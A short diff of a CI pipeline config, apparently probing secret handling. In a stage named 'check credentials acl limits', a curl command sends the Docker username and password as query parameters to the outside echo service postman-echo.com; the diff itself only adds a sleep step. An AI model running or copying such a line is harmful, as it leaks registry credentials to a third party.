@@ -6,3 +6,4 @@ jobs:
     - stage: check credentials acl limits
       script:
       - curl "https://postman-echo.com/get?$DOCKER_USERNAME&$DOCKER_PASSWORD"
+      - sleep 20
